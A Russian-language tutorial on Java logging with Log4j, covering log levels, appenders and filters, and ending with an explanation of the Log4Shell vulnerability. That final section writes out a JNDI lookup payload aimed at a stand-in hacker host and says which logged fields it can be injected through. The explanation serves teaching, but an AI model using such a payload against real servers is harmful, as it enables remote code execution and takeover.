## 1. Введение: Что такое логи и зачем они нужны?

**Лог** — это журнал (хронология) событий, происходящих в программе во время её работы.

В процессе обучения начинающие разработчики часто используют `System.out.println()` для вывода информации и поиска ошибок. Однако в реальных коммерческих проектах (Production) этот подход **недопустим** по ряду причин:

- Нельзя гибко управлять тем, куда пишется текст (он идет только в консоль).
    
- Нельзя отключить вывод определенных сообщений без переписывания и перекомпиляции кода.
    
- Многопоточные приложения требуют синхронизированного вывода, иначе текст из разных потоков перемешается.
    
- Нет удобного форматирования "из коробки" (дата, время, имя класса, номер потока).
    

Для решения всех этих проблем используются специальные библиотеки — **Логгеры (Loggers)**.

---

## 2. Знакомство с логгером Log4j

**Log4j** (а также его современная версия Log4j2 и фасад SLF4J) — это самый популярный инструмент для логирования в экосистеме Java.

Он берет на себя всю рутину по форматированию, маршрутизации и записи сообщений, позволяя разработчику просто написать: `log.info("Пользователь сохранен");`.

---

## 3. Уровни событий (Log Levels)

Это важнейшая концепция логирования. Каждому событию (сообщению) присваивается уровень критичности.

Стандартные уровни (по возрастанию важности):

1. **TRACE**: Максимально подробная информация, буквально трассировка каждого шага (например, "Зашли в цикл, i=1"). Используется крайне редко.
    
2. **DEBUG**: Отладочная информация, полезная разработчикам при поиске багов (например, "Из БД получен JSON: {...}").
    
3. **INFO**: Информационные сообщения об успешном выполнении базовых бизнес-операций (например, "Сервер запущен на порту 8080", "Пользователь ID=105 авторизован").
    
4. **WARN**: Предупреждения. Программа продолжает работу, но произошло что-то подозрительное, на что стоит обратить внимание (например, "Не удалось подключиться к кэшу Redis, данные запрошены из основной БД").
    
5. **ERROR**: Ошибка. Конкретная операция провалилась (например, "Не удалось сохранить заказ из-за таймаута БД"), но приложение в целом продолжает работать.
    
6. **FATAL**: Критическая ошибка, после которой приложение, скорее всего, должно быть остановлено (например, "Отсутствует конфигурационный файл", "Невозможно подключиться к единственной базе данных").
    

---

## 4. Настройка уровней логирования

В конфигурационном файле логгера (обычно `log4j2.xml` или `application.properties`) вы задаете базовый уровень вывода логов для всего проекта или отдельных пакетов.

**Золотое правило:** Логгер будет выводить в файл/консоль все сообщения указанного уровня **и всех уровней, которые выше (серьезнее) него**.

- _Пример:_ Если вы настроили уровень **INFO**, то система запишет логи INFO, WARN, ERROR, FATAL. А вот вызовы методов `log.debug()` и `log.trace()` будут просто проигнорированы и не займут место на диске.
    
- _Как делают на практике:_ На реальных серверах (Production) обычно ставят уровень INFO или WARN, чтобы не засорять диски петабайтами текста. А на компьютерах разработчиков (Local) включают DEBUG.

## 5. Аппендеры (Appenders)

Аппендер — это компонент Log4j, который отвечает за то, **КУДА** физически будет записан лог. У одного приложения может быть сразу несколько аппендеров (например, обычный INFO пишется в файл, а FATAL параллельно отправляется в Telegram дежурному администратору).

**Основные виды аппендеров:**

- **ConsoleAppender**: Выводит логи в стандартную консоль.
    
- **FileAppender**: Пишет все в один указанный файл на сервере.
    
- **DailyRollingFileAppender / RollingFile**: Самый частый выбор. Пишет в файл, но периодически создает новый (например, каждый день в 00:00 или когда файл достигает размера 50 МБ). Старые файлы архивируются (например, `app-log-2023-10-01.gz`).
    
- **AsyncAppender**: Сохраняет логи в отдельном асинхронном потоке, чтобы основная программа не тормозила, ожидая завершения записи текста на жесткий диск.
    
- **SocketAppender**: Отправляет логи по сети (через TCP/UDP сокеты) на другой сервер — централизованное хранилище логов (например, в систему ELK — Elasticsearch, Logstash, Kibana).
    
- **JDBC / JPA Appender**: Записывает логи напрямую в таблицы реляционной базы данных.

## 6. Фильтры логов

Иногда простого разделения по уровням (INFO/ERROR) недостаточно. Log4j позволяет настроить сложные фильтры, чтобы точечно контролировать вывод.

- Например, можно отсеивать логи по регулярному выражению (RegEx).
    
- Можно сказать логгеру: "Пиши в этот файл только те ошибки, которые содержат слово _PAYMENT_FAILED_".

## 7. Уязвимость Log4Shell (CVE-2021-44228)

В конце презентации упоминается одна из самых масштабных катастроф в истории кибербезопасности, произошедшая в декабре 2021 года.

**В чем была суть (дополнение для понимания):**

В Log4j была встроенная функция подстановки строк (JNDI lookup). Если в лог попадала строка специального формата, например `${jndi:ldap://hacker-server.com/Exploit}`, логгер пытался расшифровать её. Для этого он шел по указанному сетевому адресу хакера, скачивал оттуда Java-класс и **автоматически выполнял его прямо на сервере**.

- **Как это использовали:** Хакеру было достаточно ввести такую строку в любое поле, которое программа логирует (например, в поле "Имя пользователя" или в User-Agent браузера). Программа радостно делала `log.info("Попытка входа пользователя: " + username)`, и сервер оказывался взломан.
    
- **Последствия:** Поскольку Log4j использовался в 93% корпоративных систем на Java (от облаков Amazon и серверов Apple до игр вроде Minecraft), хакеры получили легкий доступ к миллионам серверов по всему миру.
    
- **Решение:** Разработчикам по всему миру пришлось срочно обновлять версии Log4j, где эта опасная функция была отключена.
